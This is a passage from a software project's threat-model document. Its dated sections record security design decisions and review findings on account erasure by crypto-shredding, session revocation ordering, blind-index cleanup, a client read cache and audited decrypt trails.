`schema_violation` at the same millisecond it was made — the event produced, the
trail silently empty. `AUDIT_ACTIONS` is closed, an older consumer drops every
instance it does not know, and nothing enforces the ordering. The two are NOT a symmetric pair and the catalog says
so — one is step-up gated and the other deliberately is not, so a reader tallying
them as a matched pair would conclude the ceremony is symmetric.

### Residuals

- **[CLOSED: §6oo]** *Three routes ship with no consumer,* declared under
  `EXEMPT_ACCOUNT_ERASURE` with PR4 named as the owner and an instruction to
  delete the constant with its last entry. PR4 landed, all three have a
  consumer, and the constant is gone on its own instruction.
- **[OWNER: M26]** *Legal hold is not checked at request time, and that is a
  decision rather than a gap.* `legal_hold` is a per-document flag in the
  documents cluster with no account-level equivalent, so identity cannot see it
  without a cross-cluster call — and a hold placed AFTER a request would make
  any answer given here stale. The check belongs at execution, inside the
  statement that acts. **RE-OWNED TO M26 by PR3**, which reached identity's own
  domain and no other: documents is one of the seven with no transport, so the
  hold cannot be read from here yet and nothing M25 ships will change that.
  Recorded because "erasure was requested" will read to a reviewer as "erasure
  was permitted", and on this point it is not the same claim.
- **[CLOSED: §6nn]** *There is no waiting period between request and execution.*
  This was recorded as a permanent trade-off and PR3 reversed it, which is worth
  saying plainly: building the driver showed the ACCEPTED tag was wrong. Without
  a window the driver executes the instant a request exists, so the ungated
  cancel PR2 shipped as a control would be a button nobody could press in
  time — a protective action harder than the permissive one, arrived at by
  omission. PR3 ships a seven-day grace period (`ERASURE_GRACE_PERIOD_MS`) that
  travels in the claim's own `WHERE`.
- **[CLOSED: §6nn]** *Nothing revokes sessions on request.* PR3 revokes at
  EXECUTION rather than at request, which is the correct half of the window: an
  armed request is still cancellable, so a credential is not yet wrong to hold.
  Revocation lands with the `users.status = 'closed'` write and before the
  shred, for the reason §6nn gives.

## 6nn. Threat-model delta — M25 PR3, the destroy leg (2026-08-21)

**THE PRODUCT CAN NOW ERASE SOMETHING.** `FieldCrypto.destroyDek` has a
production caller for the first time since it was written in M4, and the
`content_erased` arms M23 PR4b made real stop being decoration for identity's
domain. What changed is small and one-way: an owner's request, once its grace
period lapses, closes the account, revokes every session, unlinks the address
and destroys the DEK that seals `users.email_ct` and `mfa_methods.secret_ct`.

**IT REACHES ONE DOMAIN OF EIGHT, and the ledger says so rather than the prose.**
`erasure_domain_progress` opens a row per participant on every request and only
`identity` advances, because the other seven have no transport to ask —
`estate.auth.events.v1` has a producer and no consumer, and the audit service is
still the only Kafka consumer in the repo. A request therefore does not reach
`completed` in M25. That is the honest answer and not a bug: `completed` is
defined as *every* domain, and a terminal state meaning "as much as this build
knows how to erase" would change meaning at the next deploy. **`documents` is
the member that matters most** — `document_search_tokens` holds per-user HMACs
of document CONTENT and is named in §6ll — and it sits at `pending`.

**THE ORDER IS THE SECURITY PROPERTY.** Close and revoke run BEFORE the shred,
which inverts "the step that cannot be undone runs last" under the exception
that rule already carries: here the reversible step is the one that strands
state. `getOrCreateDek` MINTS a key for a user with no active one — correct for
every other caller, catastrophic for this one. Destroy first and any surviving
session that touches an encrypted field hands the account a brand-new DEK: the
row is live again, everything written afterwards is readable, and the trail says
the erasure succeeded. Closing and revoking first is what makes the shred the
last thing that can happen. The property is asserted on a call log, because a
database cannot observe sequence after the fact.

**THE BLIND INDEX IS OVERWRITTEN, AND PR1 IS WHY THAT IS SAFE.** `email_bidx` is
an HMAC under a service-wide key, so it lives outside the envelope and survives
the shred untouched — an erased account still answerable to "is this address
registered". PR3 replaces it with a real blind index of `<uuid>@erased.invalid`:
a reserved TLD, so it can never collide with a live address; built through
`emailBlindIndex`, so width, key and purpose label cannot drift from the live
ones. Random bytes would have been the tempting choice and the wrong one — a
replacement of the wrong shape makes every erased row identifiable by its column
alone. Had this UPDATE run under the pre-PR1 capture body it would have copied
the OLD index into `users_versions`, where `REVOKE UPDATE, DELETE` means no
later migration could retract it: erasure would have immortalised the value it
was erasing. `email_ct` is deliberately left in the shadow — it is ciphertext
under the destroyed DEK, and crypto-shredding reaching every copy is why this
repo destroys keys instead of rows.

**A SEVEN-DAY GRACE PERIOD, which §6mm recorded as ACCEPTED-not-needed and was
wrong about.** The cancel window is the only defence an owner has against an
erasure they did not ask for, since the act itself cannot be undone. Without it
the driver executes the instant a request exists and PR2's ungated cancel is
unpressable — a protective action harder than the permissive one, arrived at by
omission. The period travels in the claim's own `WHERE`, so a driver that never
ticks, ticks twice, or runs in two processes cannot shorten it.

**CANCEL NARROWS, AND SAYS SO.** Only a `pending` request is cancellable; once
claimed, keys are being destroyed. So the verb now answers WHAT IS STILL LIVE —
`null` when nothing is outstanding, the executing request when the cancel came
too late. Two outcomes with different remedies do not share an answer, and the
verb stays ungated and non-failing: telling an owner "withdrawn" about an
erasure in progress would be the worst lie this product could tell.

**A CLAIM THAT CANNOT PROCEED IS RELEASED, NOT FAILED.** Eligibility is restated
inside the claim because the request may be days old; if the account moved to
`deceased_pending` or `settlement` in the window, nothing is destroyed and the
request goes back to `pending`. Wedged in `executing` it would be uncancellable
AND would block a new one through the live index — the erasure feature locked
shut for that account, by a race.

**THE REFUSAL TOKENS SPLIT.** `closed` mapped to `account_settled`, telling an
erased account it was settled. They need opposite responses — one is a person
signing in to something they destroyed, the other a possible
decedent-credential replay worth investigating — so `account_closed` is its own
recorded reason. The wire answer is unchanged and uniform: this decides what is
RECORDED, never what is disclosed. It is reachable only in the window where
erasure half-happened, since a completed one re-indexes the address and login
stops before any status is read — which is exactly the state an operator needs
to find.

**THE DRIVER ADVANCES STATE ON A TIMER, and settlement's does not.**
`ErasureDriver` is shaped on `SettlementWorkflowDriver` deliberately, and
differs in the one way that matters. Settlement's is powerless by design: a
death claim is never fully automated and a human confirms every step. This one
destroys a key. That is permitted because the human review already happened —
the account's OWNER asked, in a session that proved a fresh second factor, and
the grace period is when they may still change their mind. No third party can
arm it and no operator role exists that could. Settlement decides something
ABOUT a person; erasure executes something FOR one.

### Residuals

- **[OWNER: M26]** *Seven of eight domains are never reached.* profile, assets,
  plaid, documents, settlement, notifications and ai-assistant keep their DEKs
  and their ciphertext after an "erasure". The ledger makes this queryable
  rather than a sentence, and `erasure-domains.spec.ts` turns red if a ninth
  participant appears — but a user told their account was erased has had one
  domain of eight erased, and no product surface may claim otherwise until the
  fan-out exists.
- **[OWNER: M26]** *`document_search_tokens` is not purged.* Its `token_bidx`
  values are per-user HMACs of document CONTENT under a service-wide key, so
  they survive a DEK destruction exactly as `email_bidx` would have. §6ll named
  this as PR3's; PR3 reached identity's domain and not documents', and the
  correction is recorded here rather than left to a reader to discover.
- **[ACCEPTED]** *A request that cannot be claimed sits at `pending`
  indefinitely.* An account moved to `settlement` keeps a live erasure request
  that will never execute and never expire. Deliberate: settlement outranks
  erasure, the owner can still cancel, and inventing a `refused` request state
  would be a terminal-looking status that invites somebody to stop retrying
  something that should resume if the account becomes eligible again.
- **[ACCEPTED]** *The caller allowlist is not a privilege boundary.*
  `ERASURE_COMPONENTS` now has one real entry, which makes leg D load-bearing
  for the first time — it stops a SECOND caller arriving in review. It does not
  stop a compromised app process calling `destroyDek` at runtime, because the
  privileged role docs/02 described has never existed. §6kk holds the runtime
  direction; nothing here narrows it.
- **[OWNER: M26]** *Nobody is told.* An erased owner receives no confirmation,
  and cannot be told afterwards — the address is unlinked and the ciphertext
  that held it is unreadable, so any notification must be sent BEFORE the shred
  or not at all. That ordering constraint is the real content of this residual,
  and it is easy to get wrong once notifications joins the fan-out.

## 6oo. Threat-model delta — M25 PR4, the owner's erasure surface (2026-08-21)

**THE THREE ROUTES HAVE A CONSUMER, and `EXEMPT_ACCOUNT_ERASURE` is deleted on
its own instruction.** A GraphQL query and two mutations at the BFF, a panel on
/security, and the same asymmetry carried through every layer: arming is
step-up gated AND takes a deliberate confirmation, withdrawing is one button
with neither.

**THE COPY IS THE CONTROL ON THIS SURFACE, which is unusual and worth stating.**
Erasure reaches ONE domain of eight (§6nn), so "your account has been erased" is
a sentence the platform cannot support. The panel says what is destroyed now,
says the rest is queued and not yet erased, and refuses to claim a completion
the ledger cannot show. It also refuses to soften the half that IS true: the key
is destroyed, there is no support path that restores it, and this is not a
deactivation. A test asserts both sentences, because copy is the only place
where a promise this large lives and the only thing that would catch its drift.

**A CONTROL THAT CANNOT WORK IS WORSE THAN ITS ABSENCE.** No stop button is
rendered once a request is `executing` — the driver has claimed it and nothing
can halt it, so a button there would leave someone believing they had stopped an
erasure that was destroying keys. The withdrawable set is an ALLOWLIST
(`pending`), not a check for `executing`: identity owns that vocabulary and it
grows, so a state this build has not met falls through to "cannot be stopped
from here" rather than to an enabled button whose press would be refused.

**A FAILED READ IS NOT "NOTHING SCHEDULED".** The panel renders neither the arm
button nor a state when it could not ask — offering to start an erasure while
unable to say whether one has already started is how a second request gets made
against an account that already has one.

**THE TWO REFUSALS STAY APART ACROSS FOUR HOPS.** Identity answers
`open_death_report` and `erasure_not_permitted`; the BFF maps them TOKEN-FIRST
(both arrive as 409, so a status-keyed rule could not tell them apart) to
`OPEN_DEATH_REPORT` and `ERASURE_NOT_PERMITTED`; the web app carries both in
`GQL_ERROR_CODES` and gives each its own sentence, one of which names a remedy
the owner can take. A 409 token the edge has NOT learned falls through to the
shared mapper rather than being guessed at, so a future refusal surfaces as an
unmapped failure instead of wearing the wrong remedy.

**A DEFECT IN PR3, FOUND BY ASKING WHAT THE COPY COULD PROMISE.** PR3's driver
claimed only `pending` requests, so a process killed between the claim and the
shred left a request in `executing` that NOTHING EVER RETURNED TO — uncancellable
by design, blocked from being re-requested by the live unique index, holding an
account that was promised destruction and did not get it. The per-step
idempotence PR3 documented was real and unreachable. The claim now has a second
arm for stalled requests, with no grace period and no status allowlist on it
(the account is already `closed`, so the allowlist would refuse every resume,
and the waiting period was served before the first claim).

**AND THE FIX'S FIRST DRAFT WAS AN INFINITE LOOP,** which is the part worth
keeping. It asked "does this request have unfinished work" — permanently true
while seven domains have no transport — so the sweep re-claimed one row forever.
The predicate now asks about the CALLER'S OWN domain, which goes false the
moment that domain reports. A `worked` set backs it up, because the failure mode
of getting this wrong is a driver that never returns, which no assertion can
catch and no timeout can name.

### Residuals

- **[OWNER: M26]** *The surface can arm an erasure the platform cannot finish.*
  Everything the panel says is true, and it is still offering a destructive
  action whose reach is one domain of eight. The honest mitigation is the copy
  and the ledger; the real one is the fan-out. Recorded as a residual rather
  than treated as shipped scope, because "the user was told" is a weaker answer
  than "the product does what its button says".
- **[ACCEPTED]** *An owner with no second factor cannot arm erasure.*
  `StepUpGuard` refuses and the prompt asks for a code they cannot produce.
  Pre-existing across all six `StepUpPrompt` callers (M23 PR4c recorded it), and
  it fails in the SAFE direction here — the one action that cannot be undone is
  the one it is least costly to be unable to reach.
- **[ACCEPTED]** *Nothing on the page warns that erasure is coming before it
  runs.* The grace period is visible only to somebody who returns to /security.
  A mailed warning would be the obvious addition and cannot be built here: the
  notification would have to go out before the shred, and notifications is one
  of the seven domains with no erasure transport, so wiring it for this alone
  would build half the fan-out in the wrong PR. §6nn holds the ordering
  constraint that makes it delicate.


## 6pp. Threat-model delta — M25 PR5, the security review (2026-08-21)

**THE CORPUS, STATED, because a review whose reach is unstated reads as
complete no matter what it covered.** Everything M25 shipped: identity's
erasure controller, service, repos, driver and migrations 014-015; the
contracts vocabulary and its fence; the BFF's erasure client, schema and
resolvers; the web panel and its copy; and — because the review's first
question was "what else is in this category" — every LIVE column in identity's
own cluster that sits outside the per-user envelope. Not covered: the seven
domains with no erasure transport, which have no code to review yet.

**FINDING 1 — THE CREDENTIAL VERIFIER SURVIVED THE SHRED.** `users.password_hash`
is a plain TEXT Argon2id verifier, outside the envelope, so destroying the DEK
never reached it. An erased account's row still held a value derived from a
secret its owner may have used elsewhere, workable offline, forever. What makes
this one worth recording is that THE ARGUMENT WAS ALREADY IN THE TREE: migration
008 excluded `password_hash` from the `users` version shadow in M17 with exactly
this reasoning, and nobody applied it to the live column. A rule applied to one
member of a category is a rule half-applied, and here the two members were four
lines apart in the same file. `closeAndUnlinkEmail` now nulls it in the same
statement that closes the account — the column was already nullable and every
reader already guards it, so this cost nothing but noticing.

**FINDING 2 — A SECOND LIVE BLIND INDEX, AND A RESIDUAL SWEEP THAT SAID
OTHERWISE.** `email_changes.new_email_bidx` is an HMAC under the same
service-wide key as `users.email_bidx`; the shred does not reach it, and the
table carries `REVOKE DELETE`, so its rows outlive everything. An erased account
still answered "was this address ever staged here" — the exact question PR3 went
to the trouble of removing from `users`. §6ll's PR3 entry filed it under
"belongs to the domains M25 does not reach", beside `contacts.email_bidx` and
`plaid_items`, which are genuinely other services'. THE GROUPING WAS BY COLUMN
NAME AND THE OWNERSHIP QUESTION WAS NEVER ASKED: `email_changes` is identity's
own table, in identity's own cluster, reachable by the leg PR3 had already
shipped. §6ll is corrected in place. The destroy leg now re-indexes every row of
the user's, live or historical, to a blind index of `<uuid>@erased.invalid` —
the same construction as `users.email_bidx` for the same reason, so no erased
row is identifiable by the shape of its own column. A COMPLETED change keeps its
`revoked_at` NULL: this table is evidence, and a completed change was not
revoked.

**THE UNLINK RUNS OUTSIDE THE CLOSE BLOCK, which is the whole of its
correctness.** Hung off `status !== 'closed'` it would be skipped on exactly the
path PR4's resume arm exists to serve — claimed, closed, interrupted. That is
the same shape of unreachable idempotence PR4 found in PR3's leg, one milestone
later, so it is asserted by a test that first proves the close really was
skipped. It also runs AFTER the ineligibility hand-back, so the "nothing has
been destroyed, hand the claim back" promise above it stays true.

**A FENCE ON WHO MAY MINT A STEP-UP.** `grantStepUp` widens
`sessions.stepup_expires_at`, which is what stands between a taken session and
vault open, document generation, erasure and every trustee change. Two callers
may do it and both are FACTOR PROOFS — TOTP verification and a passkey
assertion. The fence anchors on the injected TYPE (`SessionsRepo`), not on a
field name a caller chose, asserts set EQUALITY rather than a floor, and
separately asserts that the five REDEMPTION services — which authenticate
somebody without a second factor — contain no call to it at all. An
unauthenticated redeem route granting step-up is the shape of the M14-era
finding this repo has already met once; it is now data plus a test rather than
prose. The window itself is pinned to a single extracted assignment expression,
because the first draft asserted the file merely CONTAINED `STEPUP_WINDOW_MS`
and a surviving mutation satisfied that from the import line.

**A NON-FINDING, RECORDED BECAUSE THE ABSENCE IS THE ANSWER.**
`devices.fingerprint_hash` is the third out-of-envelope digest in identity's
cluster and it has NO WRITER anywhere in the service — the table is dormant. It
needs no erasure leg, and the reason it needs none will stop being true the day
something writes to it, which is why this is here and not in a comment.

### Residuals

- **[ACCEPTED]** *Repeatedly arming and withdrawing an erasure floods the audit
  trail.* Each press emits `account_erasure_requested` or `_cancelled`, and
  nothing bounds the pair. Accepted rather than fixed: the ceremony is step-up
  gated on the arming half, the events carry entity IDs and enums only, and a
  rate refusal here would have to be told apart from the two refusals §6oo
  keeps deliberately distinct. The cost of getting a bound wrong on this route
  is an owner who cannot withdraw, which is the direction that must never fail.
- **[OWNER: M26]** *The out-of-envelope category is closed for identity's
  cluster ONLY.* `users.email_bidx`, `users.password_hash` and
  `email_changes.new_email_bidx` are the live members identity owns and all
  three are now reached. `contacts.email_bidx`, `plaid_items`,
  `document_search_tokens.token_bidx` and whatever the other five domains hold
  are not — and this PR's finding 2 is the evidence that the way to be wrong
  about that list is to build it from column names. Each domain's erasure leg
  owns enumerating its OWN out-of-envelope columns.
- **[ACCEPTED]** *A dormant `devices` table has no erasure leg.* Correct today
  and silently wrong the day it gets a writer. No fence derives "tables holding
  an out-of-envelope digest" from the DDL, so nothing would notice; the
  honest statement is that this rests on the reviewer of that future writer.

## 6qq. Threat-model delta — M24 PR1, the shared client read cache (2026-08-21)

**A CACHE IS AN AUDIT-EVASION PRIMITIVE UNLESS ENROLLMENT IS A CONTROL, which
is why a frontend convenience gets a threat-model delta at all.** Every
content/PII read in this platform spends a LOGGED KMS decrypt on the owner's
trail; a client cache that served one from memory would make the repeat read
invisible to that trail — the audited-decrypt UI constraint, violated by a
mechanism rather than a mistake. So the cache
(`apps/web/src/graphql/read-cache.ts`) enrolls reads by ALLOWLIST against a
written bar: no audited decrypts, no decrypted PII, no variables. The enrolled
set is pinned EXACTLY by a test (today: `EmailVerification`, an enum), so
growth is a reviewed argument against the bar, and a compile-time check
refuses a parameterized enrollment outright.

**INVALIDATION IS STRUCTURAL — the transport announces, no ceremony
remembers.** `gqlRequest` announces every successful MUTATION from the one
place all mutations pass through; the cache maps announcements to reads as
data (`VerifyEmail` and `CompleteEmailChange` → `EmailVerification` — both
vouch for an address; cancel and resend deliberately absent — neither changes
the answer). A refused mutation announces nothing, `SESSION_RENEWED` included:
nothing was performed. The rejected design — each ceremony call site
remembering an invalidate call — is the forgot-to-tell-the-reader class the
§6v banner residual WAS.

**THE AUTHORITY STAYS THE SERVER.** An invalidation discards an answer and
re-asks; it never patches a value. A known-wrong answer (invalidated) stops
rendering before the re-read lands; a merely-old one (navigation revalidate)
keeps rendering until it does. Supersede tokens keep an answer fetched BEFORE
a mutation from landing AFTER its invalidation, including when no subscriber
is mounted to trigger a correcting refetch.

**THE §6v BANNER-STALENESS ITEM IS CLOSED BY THIS DELTA.** The app-shell
`UnverifiedAddressBanner` subscribing through the cache is the capability's
first consumer, and the closure was driven live in that item's own scenario
(docs/04, M24 PR1 record).

### Residuals

- **[ACCEPTED]** *The cache is tab-scoped: a ceremony completed in another tab
  is not seen until this tab's next navigation.* The announcement channel is
  in-process, and wiring a BroadcastChannel for it would add a cross-tab
  invalidation path for one banner's edge case. Pre-cache behavior was
  identically stale across tabs, and the direction is harmless — a banner
  nagging about something already done, never hiding a real gap.
- **[ACCEPTED]** *The enrollment bar is enforced by review, not derived.*
  Whether an operation is an audited decrypt is a fact about the SERVICES, and
  no client-side fence can derive it — the pinned-set test makes growth
  visible and deliberate, which is the reviewable half; judging a candidate
  against the bar stays with the reviewer reading the written bar beside the
  diff.

## 6rr. Threat-model delta — M24 PR2, the address on file (2026-08-21)

M24 PR2 gives `users.email_ct` its first reader ever — from M1 until now the
column was write-only (set at INSERT, replaced at the change switch, decrypted
never; login resolves by blind index, and the change ceremony decrypts its own
STAGED copy). A first reader of sealed PII is exactly where controls are
decided, so this delta records them:

**THE RECORD GOES FIRST, AND FAILS CLOSED IN BOTH DIRECTIONS.** Every read
lands TWO events on the owner's trail: a route-level `auth.email.viewed` (new
`AUDIT_ACTIONS` member) naming the SESSION that asked, emitted BEFORE the
decrypt — the `estatesNaming`/`distributionAmount` rule, so a crash cannot
leave plaintext with no record — and then FieldCrypto's automatic
`crypto.field.decrypted`. If the route-level emit refuses, the decrypt never
runs, matching the sink's own posture with plaintext it cannot log. The
ordering's accepted false positive (a recorded view of a value the shred race
made unreadable) is the safe direction.

**A DEDICATED, ACCOUNT-ONLY ROUTE — never a field on `session`.** `GET
/v1/auth/session` is the cross-service introspection hot path admitting every
audience: an email field there would spend a logged KMS decrypt on every
guarded request in the product and disclose PII to vault/extension/operator
sessions. The new GET is undecorated — account audience only, deny by
default. NO STEP-UP, deliberately: reading one's own PII follows the profile
contact-detail precedent, the step-up list names no self-disclosure case, and
the control is the trail plus the M18 decrypt-rate bound on the `users`
prefix — whose reviewed note now names the prefix's two REAL producers (the
change ceremony's staged-copy decrypt, and this read). Its M18 sentence was
doubly wrong: this PR falsified its "only", and this PR's own review found
its "notice" producer had never existed under the prefix at all — the
old-address notice resolves through the notifications store.

**THE CLIENT ASKS ONLY WHEN THE OWNER ASKS.** The /security surface is
reveal-on-demand: no mount-time read (the no-prefetch rule — a page visit is
not consent to a recorded disclosure), no enrollment in the §6qq read cache
(its written bar excludes decrypted PII precisely so a repeat read can never
be served invisibly from memory), and a completed address change DISCARDS a
revealed answer rather than re-reading it — the fresh disclosure stays the
owner's explicit, separately-recorded act.

**ERASED IS ITS OWN ANSWER, ALL THE WAY TO THE BROWSER.** A decrypt racing a
crypto-shred answers identity's first 410 `content_erased`
(`distributionAmount`'s arm), and the BFF's shared identity mapper gained its
first 410 arm to carry it as `CONTENT_ERASED` — without that arm the erasure
control firing would mask into a generic outage and invite retries against a
key destroyed on purpose. The web renders it as erasure with no retry
affordance in either spelling.

**THE ADDRESS STRUCTURALLY CANNOT RIDE THE TRAIL.** `SAFE_TOKEN_PATTERN`
rejects `@` in audit detail keys and values, so the disclosure event could
not carry the email even by mistake — the absence-over-filter shape. The int
suite's PII firewall sweeps every emitted message for the address and
password besides.

**THE §6v ADDRESS-ON-FILE ITEM IS CLOSED BY THIS DELTA.**

### Residuals

- **[ACCEPTED]** *`auth.email.viewed` requires the audit consumer to deploy
  before identity.* The closed-vocabulary rule: an older consumer drops every
  unknown-action event as `schema_violation`, silently, and nothing enforces
  the ordering. With nothing deployed anywhere the rule costs one sentence in
  the deploy runbook rather than a deployment — recorded here so the first
  real rollout inherits it as a constraint, not a surprise.
- **[ACCEPTED]** *The reveal control renders whenever the section does, even
  for a session whose read would answer 410.* The page cannot know the
  account was shredded without asking — asking IS the disclosure event — so
  "never offer an action the server would refuse" yields here to the
  no-prefetch rule, and the refusal is rendered honestly as erasure when the
  owner does ask. The window is the erasure grace race and nothing else: a
  closed account cannot hold a session at all.

## 6ss. Threat-model delta — M24 PR3, the dashboard and the cache's auth boundary (2026-08-22)

**THE §6qq CACHE SURVIVED A USER SWITCH, AND THAT IS CLOSED HERE AS DATA.**
Sign-out and sign-in are both client-side navigations, the cache's entries are
keyed by OPERATION NAME rather than principal and outlive their subscribers,
and the only reset was harness-only — so on a shared browser, user B's first
mount found user A's cached answer and rendered it WITH ZERO FETCHES. `Logout`
was even the cache suite's own "invalidates nothing" negative control. Today
the exposure was one email-verification enum; under any future enrollment it
would have been that enrollment's data, cross-principal. The fix extends the
§6qq invalidation map: `Login`, `Register` and `Logout` — the mutations that
can change WHO the answers are about — each invalidate `CACHED_OPERATIONS`
itself, BY REFERENCE, so every future enrollment inherits the boundary without
anyone remembering it (`CompletePasswordReset` mints no session; the sign-in
that follows it is a `Login`). The negative control moved to
`CancelEmailChange`, and each door has its own behavior test. Found by the PR3
design fan-out's completeness critic; no lens had asked what clears the cache
at the auth boundary.

**THE DASHBOARD READS ON THE OWNER'S TERMS.** The home page became the
dashboard with NO new SDL surface and NO new decrypt class: the session read
gates every tile read (a signed-out landing spends zero of them — the one
query it still issues is the self-hiding executor panel's decrypt-free
`ExecutorCases` probe, the M23 design kept verbatim, which answers a refusal
and renders nothing); the signed-in mount issues that probe plus the /assets
page's own sanctioned shape (Assets + NetWorth, the per-valued-row
`est_value` decrypts) plus decrypt-free reads
(Documents, Sessions, Passkeys, and the cache-shared EmailVerification); and
**[CORRECTED BY PR4, §6tt]** — the probe was decrypt-free only for the caller
with no linked estate. Its resolver named the decedents unconditionally,
spending one audited cross-user `legal_name` decrypt per linked estate on
every landing, for a panel that rendered nothing; PR4 skips the naming when
settlement returns no case, so the sentence above is now true for every
signed-in caller who is settling nothing, and an executor WITH cases spends
those decrypts to render the estates they are settling. And
the four readiness analyses — per-row asset decrypts times four, two full
profile PII fans, a family read, an audit event per analyser — run ON DEMAND,
once per press of the estate-checks button, never per landing. The enrollment
set is UNCHANGED: NetWorth and Readiness fail the §6qq bar's first clause
(decrypt-backed — a cache would make repeat reads invisible to the owner's
trail), Assets fails its second (parameterized), and Session's `stepUpFresh`
decays by clock, which no mutation-driven invalidation can announce. The M18
asset decrypt-bound's page-shape note was re-derived with the dashboard shape;
the distinct-subjects dimension already suppresses repeat browsing, and
neither constant moved.

### Residuals

- **[ACCEPTED]** *`Session` is double-read on `/` (the shell's `RailAccount`
  and the page gate).* Parity with the pre-PR3 page, where `RailAccount` and
  `SessionCard` each read it. Enrolling `Session` to dedupe fails the bar's
  spirit: `stepUpFresh` expires by clock and sessions change cross-client with
  no announcing mutation in this app — two cheap introspections beat a cache
  that can assert a step-up freshness that lapsed minutes ago.
- **[ACCEPTED]** *The estate-checks statuses are point-in-time.* A later
  mutation does not invalidate them; the owner re-runs on demand, and an owner
  who never presses the button is never analysed — the assistant page remains
  the full surface. The alternative (stored analysis state with an
  invalidation surface) contradicts the analyses' own no-stored-state posture
  and would spend the four-analyser decrypt fan on every landing.

## 6tt. Threat-model delta — M24 PR4, the security review (2026-08-22)

**THE MILESTONE'S OWN CONTROLS, ASKED THE M25 PR5 QUESTION: *what else is in
this category?*** Four file-scoped lenses ran against the merged M24 surface,
each finding refuted twice by independent verifiers. Nine claims were made and
seven survived; the two that did not were framings of a real mechanism whose
scope the lens had misread, and the refutations are why the mechanism below is
described as a signed-IN exposure rather than the signed-out one §6ss discusses.
Every surviving finding was the same shape: **a rule this repo had already
written down, applied to one member of its category.**

**A CROSS-USER PII DECRYPT ON EVERY LANDING, TO DECORATE AN EMPTY LIST.** The
BFF's `executorCases` resolver read settlement's case list and then
*unconditionally* called `profile.linkedEstates` to name the decedents. That
profile read is an audited cross-user disclosure: it emits
`contact.link.estates_read` and one `crypto.field.decrypted` of another
person's `legal_name`, **on that person's trail, naming the caller as the
actor**. Since M24 PR3 the dashboard is the home page and it mounts the
self-hiding executor panel on every landing, so every account that had ever
redeemed a contact link — an executor-designate, a named beneficiary, a spouse,
with the estate's owner alive and well — spent one such disclosure per linked
estate per home-page visit, for a panel that then rendered nothing. The rule
against exactly this was already written, four functions away, in
`reportableEstates`' own comment ("never prefetched — the
audited-volume-is-a-UI-constraint rule") — and enforced in neither member of
the category: that resolver's `Promise.all` spent the same disclosure before
knowing whether any row would use it. Both now read the settlement list first
and return early when it is empty. The volume itself predates PR3 (the panel is
M23's); what PR3 changed is that the panel moved onto the page everybody lands
on, and what this PR changes is that the disclosure is spent only when a name
will be rendered.

**A SESSION-STATE INDICATOR THAT COULD ONLY BE STALE IN THE PERMISSIVE
DIRECTION.** PR3 gave the dashboard an escalation: a tile read surviving to
UNAUTHENTICATED collapses the page to its signed-out arm. That fixed the page
and reached nothing else — the app shell's `RailAccount` reads `Session` once
at mount, has no subscription, and went on rendering a green dot and the word
"Signed in" beside a page that had just given up. Pressing its Sign-out control
then made the claim explicit: `Logout` answers UNAUTHENTICATED for an
already-dead session, and the button's failure arm announced *"you are still
signed in"* in a `role="alert"` — a positive assertion that a revoked
credential is live, shown to somebody who may have pressed it precisely because
they believed it was compromised. Three changes, one mechanism: the transport
announces `sessionEnded` from the ONE place the app learns a session is dead
rather than merely unreachable (a REFUSED refresh — an unavailable one says
nothing, and announcing there would sign people out during an outage); the rail
subscribes and de-escalates; and Logout treats an already-dead session as the
outcome it wanted. The dashboard's signed-out arm also stopped handing a person
whose session just died the anonymous first-visit hero, which states nothing
about what happened to their credential.

**`mfaLevel` IS THE SESSION'S FACTOR LEVEL, AND THIS IS THE THIRD TIME THAT
SENTENCE HAS COST SOMETHING.** M20 found the union declared in lowercase, which
made every comparison permanently false, fixed the enum and left the WORDING.
M24 PR3's live drive found the wording still on `SessionCard` and corrected it
on the dashboard. This review found /security — the older and larger consumer —
still saying it: `chip-warn` "MFA not enrolled" under a heading reading
"Session", loudest for the accounts it was most wrong about, since
`AuthService.login` never asks for a factor and every TOTP-holding owner starts
every sign-in at `NONE`. The same field also chose the enrolment button's
label, so that owner was offered a FIRST enrolment for a factor they already
held — and refused by `SecondFactorGate` when they took it, into an arm that
named no next step while the passkey caller of the same refusal named one. The
chips now live in one place for both surfaces, the label states what is true
either way, and the refusal carries the fact the page cannot know. The test
that had kept the false wording green was named for a property its fixture
could not decide — `mfaLevel: 'NONE'` is byte-identical for a factorless
account and a TOTP-holding one — which is why a human had to find this twice.

**AND IN THE OPERATOR CONSOLE, THE SAME SHAPE AGAIN.** Revealed distribution
amounts are held in a module map so that a re-render cannot silently re-spend
an audited decrypt on the decedent's trail, and they are dropped when the
reviewer leaves the case — through one of the two exits. The other is the
failed-case screen, reached whenever `getCase` is the one of four reads that
refuses, which that file's own comment calls routine. Through it the map
survived: on the next visit the decedent's decrypted figure rendered again with
NO new `settlement.distribution.amount_viewed`, and the Show-amount control was
suppressed (its own presence check reads the map), so nothing was left to ask
honestly with — an undercount of who read that estate's sealed money, and a
stale figure a reviewer could then approve a distribution against. Both exits
now go through one `leaveCase()`, and so does the signed-out arm: a console
holding no session holds no decedent's figures.

### Residuals

- **[ACCEPTED]** *An executor WITH cases still spends one cross-user decrypt
  per linked estate, not per case.* `profile.linkedEstates` answers the
  caller's whole linked set and the BFF joins it down to the cases; narrowing
  it would need a contact-id-scoped profile route. The disclosure is now bounded
  by "this person is genuinely settling something", which is the population the
  panel exists for, and every one of those decrypts is on the trail as it always
  was.
- **[ACCEPTED]** *The wording fence catches re-introductions of KNOWN
  spellings, not new inventions of the same claim.* `lib/session.test.ts` scans
  the component tree for the three sentences this defect has actually been
  written in; a fourth phrasing of "your account has no second factor" would
  pass. No client-side fence can derive the account's factor set — the SDL
  exposes none — so the durable half is that the chips have one implementation
  and the label no longer branches on a session field.
- **[ACCEPTED]** *`sessionEnded` is in-tab, like the read cache's boundary
  (§6qq residual 1).* A sibling tab learns on its own next request. The
  announcement corrects a chrome that would otherwise never be corrected at
  all; a cross-tab channel for it would be the same BroadcastChannel that
  residual already declines, for the same reason.

## 6uu. Threat-model delta — M27 PR0, the grantee read (2026-08-22)

**THE CEREMONY IS SHIPPED, AND COMPLETING IT DELIVERS NOTHING WHILE SPENDING
ITSELF.** A grantee who waits out the period, is not denied, and passes the
settlement gate reaches `apps/vault-web/src/client/app.ts`, which reconstructs
the owner's master key on their device, calls `wipe()` on it, and tells them
the arrangement "is now spent". `emergency.service.ts` then refuses re-release
at four sites with `already_released`. So in the ONE scenario §5.2 exists for
— the owner dead or incapacitated — the grantee burns the escrow and receives
no data, and the only recovery is the owner re-arming, which is precisely what
they cannot do. This is not a missing feature at the edge of a control; it is
a control whose success path is indistinguishable from its failure path, and
it has been shipped since M6 PR2. (**PR3a BUILT IT — §6yy.** This section
keeps PR0's tense, on the precedent §6ww and §6xx set: a design delta records
